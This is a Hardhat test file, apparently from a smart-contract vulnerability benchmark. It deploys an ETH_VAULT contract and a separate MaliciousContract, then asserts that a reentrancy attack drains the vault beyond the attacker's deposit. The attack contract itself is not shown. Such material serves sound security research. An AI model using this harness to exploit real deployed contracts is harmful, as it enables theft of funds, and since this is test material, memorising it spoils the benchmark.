const { expect } = require("chai");
const { ethers } = require("hardhat");
const path = require("path");
const fs = require("fs");
const exp = require("constants");
describe("Reentrancy Attack for 0x8c7777c45481dba411450c228cb692ac3d550344.sol", function () {
  let ETH_VAULT;
  let victim;
  let MaliciousContract;
  let hacker;
  let Log;
  let log;

  beforeEach(async function () {
    // Deploy Log contract
    const logPath = path.join(
      __dirname,
      "../../artifacts/contracts/dataset/reentrancy/0x8c7777c45481dba411450c228cb692ac3d550344.sol/Log.json",
    );
    const logJson = JSON.parse(fs.readFileSync(logPath));
    Log = await ethers.getContractFactory(logJson.abi, logJson.bytecode);
    log = await Log.deploy();
    await log.waitForDeployment();

    // Deploy ETH_VAULT contract with Log address
    const codePath = path.join(
      __dirname,
      "../../artifacts/contracts/dataset/reentrancy/0x8c7777c45481dba411450c228cb692ac3d550344.sol/ETH_VAULT.json",
    );
    const json = JSON.parse(fs.readFileSync(codePath));
    ETH_VAULT = await ethers.getContractFactory(json.abi, json.bytecode);
    victim = await ETH_VAULT.deploy(log.target);
    await victim.waitForDeployment();
    //await eth_VAULT.setLog(log.target); // Set Log address after deployment

    // Deploy MaliciousContract with ETH_VAULT address
    MaliciousContract = await ethers.getContractFactory(
      "contracts/reentrancy/0x8c7777c45481dba411450c228cb692ac3d550344_attack.sol:MaliciousContract",
    );
    hacker = await MaliciousContract.deploy(victim.target);
  });

  it("functional check: reentrancy/0x8c7777c45481dba411450c228cb692ac3d550344.sol", async function () {
    const [v, a] = await ethers.getSigners();
    const amount = ethers.parseEther("10");
    // oracle: check if Deposit works for a benign case
    await expect(victim.connect(a).Deposit({ value: amount })).to.not.be
      .reverted;
    expect(await ethers.provider.getBalance(victim.target)).to.equal(amount);
    
    // oracle: check if CashOut works for a benign case
    const balanceBefore = await ethers.provider.getBalance(a.address);
    const tx = await victim.connect(a).CashOut(amount);
    const receipt = await tx.wait();
    const gasFee = receipt.gasUsed * receipt.gasPrice;
    // victim should have 0 balance
    expect(await ethers.provider.getBalance(victim.target)).to.equal(0);
    // a should have previous balance + amount - gasFee
    expect(await ethers.provider.getBalance(a.address)).to.equal(
      balanceBefore + amount - gasFee,
    );
  });

  it("should successfully drain funds through reentrancy attack", async function () {
    // Initial deposit to victim contract
    await victim.Deposit({ value: ethers.parseEther("5") });

    const victimInitialBalance = await ethers.provider.getBalance(
      victim.target,
    );
    expect(victimInitialBalance).to.equal(ethers.parseEther("5"));

    // Initial deposit from hacker on victim contract
    await hacker.deposit({ value: ethers.parseEther("5") });

    const victimBalanceAfterDeposit = await ethers.provider.getBalance(
      victim.target,
    );
    expect(victimBalanceAfterDeposit).to.equal(ethers.parseEther("10"));

    // Set hacker balance to 0
    await network.provider.send("hardhat_setBalance", [hacker.target, "0x0"]);
    let hackerBalance = await ethers.provider.getBalance(hacker.target);
    expect(hackerBalance).to.equal(0);

    // Perform reentrancy attack through MaliciousContract
    await hacker.attack(ethers.parseEther("4"));

    // Check balances after attack
    const victimBalance = await ethers.provider.getBalance(victim.target);
    const maliciousContractBalance = await ethers.provider.getBalance(
      hacker.target,
    );

    // Verify the attack was successful
    // victim has lost more funds than the hacker balance (10-5=5)
    expect(victimBalance).to.be.below(ethers.parseEther("5"));

    //hacker has more than the deposited amount
    expect(maliciousContractBalance).to.be.above(ethers.parseEther("5"));
  });
});
